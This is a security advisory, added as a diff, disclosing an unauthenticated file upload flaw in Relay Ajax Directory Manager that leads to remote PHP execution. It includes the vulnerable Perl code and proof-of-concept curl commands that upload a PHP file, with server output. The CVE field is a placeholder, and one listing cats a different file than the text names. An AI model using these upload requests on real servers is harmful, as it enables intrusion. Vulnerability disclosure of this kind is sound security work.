@@ -1,0 +1,224 @@
+Advisory: Unauthenticated File Upload in Relay Ajax Directory Manager
+          may Lead to Remote Command Execution
+
+A vulnerability within the Relay Ajax Directory Manager web application
+allows unauthenticated attackers to upload arbitrary files to the web
+server running the web application.
+
+
+Details
+=======
+
+Product: Relay Ajax Directory Manager
+Affected Versions: relayb01-071706, 1.5.1, 1.5.3 were tested, other
+                   versions most likely vulnerable as well.
+Fixed Versions: -
+Vulnerability Type: Unauthenticated File Upload
+Security Risk: high
+Vendor URL: https://github.com/HadoDokis/Relay-Ajax-Directory-Manager
+Vendor Status: decided not to fix, project is unmaintained
+Advisory URL: https://www.redteam-pentesting.de/advisories/rt-sa-2016-005
+Advisory Status: published
+CVE: GENERIC-MAP-NOMATCH
+CVE URL: https://cve.mitre.org/cgi-bin/cvename.cgi?name=GENERIC-MAP-NOMATCH
+
+
+Introduction
+============
+
+Relay Ajax Directory Manager[1], also known as relay[2], is a web-based
+file manager. It allows files and folders to be uploaded via drag and
+drop and provides several other features, such as a thumbnail preview
+for images and basic user authentication functionality.
+
+
+More Details
+============
+
+While the web application itself is mostly written in PHP, it also
+utilizes the Perl script 'upload.pl' for handling uploads initiated by
+the user.
+
+Uploading is a multi-step process:
+
+1. The user initiates a multipart/form-data upload request through the
+   web application. This request is sent to the Perl script and the
+   following steps are handled by it.
+2. A temporary file containing the entire request (including
+   headers) is created. This temporary file is named partly by the first
+   URL parameter, as shown in the following listing.
+3. The headers and the POST body of the request are parsed and filtered
+   to determine the final filename.
+4. The upload is written to the final destination.
+5. A file containing statistics about the upload process is written
+
+During steps 2-5, no checks are performed to ensure that the user is
+sufficiently authenticated.
+
+The following listing shows parts of the upload Perl script:
+
+-- upload.pl -----------------------------------------------------------
+
+[...]
+
+@qstring=split(/&/,$ENV{'QUERY_STRING'});
+$sessionid = $qstring[0];
+
+[...]
+
+$tmpfile   = "$uploadsFolder\\temp_$sessionid";
+$statsfile = "$uploadsFolder\\stats_$sessionid.txt";
+$tmpfilepre= "$uploadsFolder\\$sessionid\_";
+
+[...]
+
+open(FILE,">","$tmpfilepre$filename") or print "can't open temp file";
+binmode(FILE);
+print FILE $filedata;
+close FILE;
+
+[...]
+
+------------------------------------------------------------------------
+
+Here, the first URL parameter is stored in the variable $sessionid. The
+content of this variable is then used as a prefix for the filename for
+the uploaded data before it ultimately gets written. Given the
+configured upload directory, which is 'uploads/' by default, the URL of
+the uploaded file can be determined.
+
+The web application usually requires users to be authenticated before
+any actions (e.g. uploading) can be performed, but since the Perl script
+is not secured by any form of authentication, it can be accessed by
+anyone. If the web server does not prohibit the execution of e.g. PHP
+files within the upload directory, arbitrary PHP commands can be
+executed by uploading the respective files to the web server.
+
+
+Proof of Concept
+================
+
+In general, the Perl script expects a request containing
+multipart/form-data. In this case, the name specified in the 'filename'
+field is prepended with the first URL parameter. Using the command line
+HTTP client curl, a request like the following can be made to a
+vulnerable installation of Relay Ajax Directory Manager in order to
+upload a PHP script which invokes the function 'phpinfo()':
+
+curl -i -s -k  -X 'POST' \
+-H 'Content-Type: multipart/form-data; boundary=----------------------------83ff53821b7c' \
+--data-binary $'------------------------------83ff53821b7c\x0d\x0a'\
+$'Content-Disposition: form-data; filename=\"info.php\"\x0d\x0a'\
+$'Content-Type: application/octet-stream\x0d\x0a\x0d\x0a'\
+$'<?php phpinfo(); ?>\x0d\x0a'\
+$'------------------------------83ff53821b7c--' \
+'http://example.com/relay-1-5-3/upload.pl?redteam'
+
+The server responds with HTTP status code 200 indicating a successful
+upload:
+
+HTTP/1.1 200 OK
+Date: Mon, 09 May 2016 11:09:50 GMT
+Server: Apache/2.4.18 (Debian)
+Content-Length: 0
+Content-Type: text/plain
+
+Such a request would yield the following files in the web server's
+upload directory upon success:
+
+$ ls relay-1-5-3/uploads/
+redteam_info.php  stats_redteam.txt  temp_redteam
+
+The file redteam_info.php contains the multipart/form-data that was
+sent to the upload.pl script:
+
+$ cat relay-1-5-3/uploads/temp_redteam.php
+<?php phpinfo(); ?>
+
+Requesting this file with the URL
+http://example.com/relay-1-5-3/uploads/redteam_info.php will then yield
+the server's output of the phpinfo() function.
+
+However, since the entire content of the upload request is saved to a
+temporary file, a regular POST request containing only the code to be
+executed is sufficient to exploit this vulnerability. The following
+invocation of curl uploads the same PHP script which invokes the
+function 'phpinfo()':
+
+$ curl --silent --include --data '<?php phpinfo(); ?>' \
+'http://example.com/relay-1-5-3/upload.pl?redteam.php'
+
+In the server's upload directory, the file temp_redteam.php contains
+the data that was sent to the upload.pl script:
+
+$ ls  relay-1-5-3/uploads/
+stats_redteam.php.txt  temp_redteam.php
+
+$ cat temp_redteam.php
+<?php phpinfo(); ?>
+
+Requesting this file with the URL
+http://example.com/relay-1-5-3/uploads/temp_redteam.php will again yield
+the server's output of the phpinfo() function.
+
+Using either of these methods, an attacker is able to upload arbitrary
+files to the affected web server e.g. in order to easily execute PHP
+commands with the privileges of the web server.
+
+
+Workaround
+==========
+
+One possible workaround would be to prevent the execution of files in
+the upload directory and deliver them as attachments instead.
+
+
+Fix
+===
+
+None.
+
+
+Security Risk
+=============
+
+This vulnerability allows unauthenticated attackers to upload arbitrary
+files to the affected system. In the web server's and project's default
+configuration it is very likely that this may be used to execute
+arbitrary commands with the privileges of the web server process. This
+is possible without authentication, thereby providing no barrier for
+attackers. It is therefore rated as a high risk. Since this software is
+quite old and not well maintained, it is likely that additional
+vulnerabilities exist. However, this was not further evaluated.
+
+
+Timeline
+========
+
+2015-11-19 Vulnerability discovered
+2016-04-07 Customer approved disclosure of vulnerability
+2016-05-12 Developers contacted, project is no longer maintained
+2016-05-31 Advisory published
+
+
+References
+==========
+
+[1] https://github.com/HadoDokis/Relay-Ajax-Directory-Manager
+[2] https://code.google.com/p/relay/
+
+
+RedTeam Pentesting GmbH
+=======================
+
+RedTeam Pentesting offers individual penetration tests performed by a
+team of specialised IT-security experts. Hereby, security weaknesses in
+company networks or products are uncovered and can be fixed immediately.
+
+As there are only few experts in this field, RedTeam Pentesting wants to
+share its knowledge and enhance the public knowledge with research in
+security-related areas. The results are made available as public
+security advisories.
+
+More information about RedTeam Pentesting can be found at:
+https://www.redteam-pentesting.de/
